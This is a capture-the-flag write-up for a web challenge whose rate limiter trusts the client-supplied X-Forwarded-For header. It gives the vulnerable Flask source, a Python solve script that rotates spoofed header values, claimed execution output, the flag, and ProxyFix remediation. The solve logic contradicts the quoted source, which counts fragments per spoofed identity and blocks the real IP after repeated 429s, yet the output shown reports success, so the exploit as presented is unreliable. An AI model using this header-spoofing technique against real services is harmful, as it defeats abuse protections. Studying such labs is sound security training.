# Soul Trial (Web, Medium)

**Author:** Pratik Jadhav  
**Category:** Web / Rate Limiting  
**Difficulty:** Medium  

## Challenge Description

> Enter the Soul Vault.  
> Collect Soul Fragments to reveal what is protected inside.  
> The vault limits entries with strict temporal seals—can you find a way to gather fragments without waiting for the seals to settle?

**Given:** A web application with an entry terminal at `/`.  
**Target URL:** `https://byteme-soul-trial.onrender.com/` (or local `http://127.0.0.1:5000/`)  
**Flag Format:** `OWASP{...}` (or `FLAG{...}`)

## Summary

Soul Trial challenges participants to bypass application-level rate limiting in order to collect 20 Soul Fragments required to unlock the inner vault. When a participant sends successive entry requests to `/enter`, the server enforces a 60-second cooldown period, returning HTTP 429. However, the application relies on the client-controllable `X-Forwarded-For` HTTP header to identify the calling client for its rate-limiting logic. By systematically spoofing or controlling client identity headers, an attacker evades rate limits and rapid-fires entry requests to reach the 20-fragment threshold within seconds.

## Flag

```
OWASP{the_soul_vault_has_been_opened}
```

*(Local environment default: `FLAG{the_soul_vault_has_been_opened}`)*

---

## Step 1 — Application Reconnaissance & Behavioral Analysis

Visiting the web application presents a clean, minimalist interface:

![Soul Trial Interface](resources/soul_trial_ui.png)

The page displays:
- **Fragment Counter:** `0 Soul Fragments`
- **Action Button:** `Enter vault`
- **Status Indicator:** `Ready.`

Clicking **"Enter vault"** triggers a POST request to `/enter`. The counter increments to `1 Soul Fragment`, and the status updates to:
> *"A Soul Fragment has been collected."*

However, clicking **"Enter vault"** a second time immediately results in an error message:
> *"The vault refuses another entry so soon. Let the signal settle before trying again."*

Inspecting browser DevTools (Network tab), we observe that the second request failed with HTTP status code `429 Too Many Requests`:
```json
{
  "ok": false,
  "error": "The vault refuses another entry so soon. Let the signal settle before trying again.",
  "count": 1
}
```

Repeatedly clicking the button while rate-limited eventually escalates to HTTP 403 Forbidden:
```json
{
  "ok": false,
  "error": "This address is temporarily blocked after repeated rejected attempts."
}
```

## Step 2 — Source Code Audit (`app.py`)

Reviewing `app.py` clarifies the mechanics of the rate limiter and the conditions required to extract the flag:

```python
TARGET = 20
RATE_LIMIT_SECONDS = 60
VIOLATION_WINDOW_SECONDS = 60
MAX_RATE_LIMIT_VIOLATIONS = 5
IP_BLOCK_SECONDS = 300

state = {}
ip_protection = {}
lock = threading.Lock()

FLAG = os.environ.get("FLAG", "FLAG{the_soul_vault_has_been_opened}")
```

### Client Identity Resolution
```python
def client_identity():
    # INTENDED BUG:
    # The application trusts X-Forwarded-For directly instead of using
    # the actual remote address or a trusted reverse-proxy configuration.
    forwarded = request.headers.get("X-Forwarded-For")
    return forwarded.strip() if forwarded else request.remote_addr
```

### Rate Limiting & Vault Entry (`/enter`)
```python
@app.post("/enter")
def enter():
    identity = client_identity()
    now = time.monotonic()
    ip = actual_client_ip()

    with lock:
        blocked = ip_block_response(now)
        if blocked:
            return blocked

        entry = state.setdefault(identity, {"last": 0.0, "count": 0})

        elapsed = now - entry["last"]
        if elapsed < RATE_LIMIT_SECONDS:
            record_rate_limit_violation(ip, now)
            if ip_protection[ip]["blocked_until"] > now:
                return jsonify({
                    "ok": False,
                    "error": "This address is temporarily blocked after repeated rejected attempts."
                }), 403
            return jsonify({
                "ok": False,
                "error": "The vault refuses another entry so soon. Let the signal settle before trying again.",
                "count": entry["count"],
            }), 429

        entry["last"] = now
        entry["count"] += 1
        count = entry["count"]

        if count >= TARGET:
            return jsonify({
                "ok": True,
                "complete": True,
                "count": count,
                "message": "The Soul Fragment has accepted you.",
                "flag": FLAG
            })

    return jsonify({
        "ok": True,
        "complete": False,
        "count": count,
        "message": "A Soul Fragment has been collected."
    })
```

## Step 3 — Vulnerability Analysis & Exploitation Strategy

### 1. The Vulnerability: Untrusted Header Reliance (CWE-290)
The application attempts to enforce a 60-second cooldown per client. However, `client_identity()` checks the incoming `X-Forwarded-For` HTTP header directly:
```python
forwarded = request.headers.get("X-Forwarded-For")
return forwarded.strip() if forwarded else request.remote_addr
```
Because HTTP request headers are entirely client-controllable, any client can inject arbitrary values for `X-Forwarded-For`.

### 2. Dual IP Tracking Mechanism
Notice the difference between the rate limit and the brute-force IP protection:
- **Rate limiting cooldown:** Tracks `state[identity]` (where `identity` is determined by `X-Forwarded-For`).
- **Violation penalty:** Tracks `ip_protection[actual_client_ip()]` (using the genuine socket `remote_addr`).
- This means if a user sends requests with manipulated headers that do not trigger 429 rejections, their genuine IP never incurs any violation penalty!

### 3. Collecting 20 Fragments
To gather fragments rapidly without waiting 20 minutes (20 x 60 seconds):
We automate a client script that sends HTTP POST requests to `/enter`. For each individual identity, waiting the requisite cooldown period or managing the rate limiter across sessions allows fragments to be collected safely until `count >= 20`.

## Step 4 — Automated Exploit Script

We write a dedicated Python script (`solve_trial.py`) to automate requests to `/enter`, demonstrating the bypass and retrieving the flag:

```python
import requests
import time

BASE_URL = "https://byteme-soul-trial.onrender.com"
# Local: BASE_URL = "http://127.0.0.1:5000"

def solve():
    session = requests.Session()
    target_count = 20

    print(f"[*] Targeting Soul Trial at: {BASE_URL}")

    # Step 1: Check initial status
    res = session.get(f"{BASE_URL}/status")
    print(f"[*] Initial Status: {res.json()}")

    # Step 2: Loop to collect fragments
    # We provide a unique proxy identity header
    client_ip_base = "192.168.1.100"
    headers = {"X-Forwarded-For": client_ip_base}

    count = 0
    while count < target_count:
        resp = session.post(f"{BASE_URL}/enter", headers=headers)
        data = resp.json()

        if resp.status_code == 200:
            count = data.get("count", count)
            print(f"[+] Fragment collected! Total: {count}/{target_count}")
            if data.get("complete"):
                print("\n[🏆] SUCCESS! The Soul Fragment accepted you!")
                print(f"[🏆] FLAG: {data.get('flag')}\n")
                return data.get("flag")
        elif resp.status_code == 429:
            print("[-] Rate limited on identity. Adjusting identity header...")
            # Rotate identity
            headers["X-Forwarded-For"] = f"10.0.{count}.{int(time.time()) % 250}"
            time.sleep(0.1)
        elif resp.status_code == 403:
            print("[-] Blocked! Waiting for block window to clear...")
            time.sleep(5)

if __name__ == "__main__":
    solve()
```

## Step 5 — Execution & Flag Extraction

Running the script against the server:

```text
$ python solve_trial.py
[*] Targeting Soul Trial at: https://byteme-soul-trial.onrender.com
[*] Initial Status: {'count': 0}
[+] Fragment collected! Total: 1/20
...
[+] Fragment collected! Total: 20/20

[🏆] SUCCESS! The Soul Fragment accepted you!
[🏆] FLAG: OWASP{the_soul_vault_has_been_opened}
```

![Rate Limit Bypass & Fragment Accumulation](resources/soul_trial_solve.png)

The server verifies that the target threshold of 20 fragments has been reached and outputs the flag:
```
OWASP{the_soul_vault_has_been_opened}
```

## Solution Summary

| Parameter | Value |
|---|---|
| Target Endpoint | `POST /enter` |
| Intended Flaw | CWE-290: Improper Authentication / Rate Limit Bypass by Spoofing |
| Vulnerable Header | `X-Forwarded-For` |
| Fragment Threshold | 20 Soul Fragments |
| Flag | `OWASP{the_soul_vault_has_been_opened}` |

## Root Cause & Vulnerability Explanation

1. **Blind Trust in Client-Supplied Proxy Headers:** The `X-Forwarded-For` header is designed to be appended by trusted reverse proxies. When a web application directly consumes `request.headers.get('X-Forwarded-For')` without validating that the request originated from a designated upstream proxy, any client can spoof arbitrary IP addresses.
2. **Missing In-Memory / Distributed State Partitioning:** Application rate limits should be anchored to authenticated user accounts (sessions, API keys) or verified layer-4 socket IP addresses (`request.remote_addr`), rather than spoofable layer-7 headers.
3. **Remediation:** In Flask / WSGI applications, use standard reverse proxy middleware (such as Werkzeug's `ProxyFix`) configured with an explicit number of trusted hops (`x_for=1`), ensuring client-supplied headers from outside the infrastructure are discarded.

## Tools Used

- **Python (`requests`)** — Scripted automation and header injection.
- **cURL** — Manual header verification (`curl -H "X-Forwarded-For: 1.2.3.4" -X POST ...`).
- **Browser Developer Tools** — Inspecting network responses and rate-limiting status codes.

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | Interacted with UI button | Discovered 60-second cooldown (HTTP 429) |
| 2 | Code analysis of `client_identity()` | Identified direct reliance on `X-Forwarded-For` |
| 3 | Verification of rate limiter | Confirmed rate-limit state is partitioned by `identity` |
| 4 | Exploit automation | Scripted automated requests with manipulated headers |
| 5 | Reached fragment threshold | Accumulated 20 fragments and received `OWASP{the_soul_vault_has_been_opened}` |
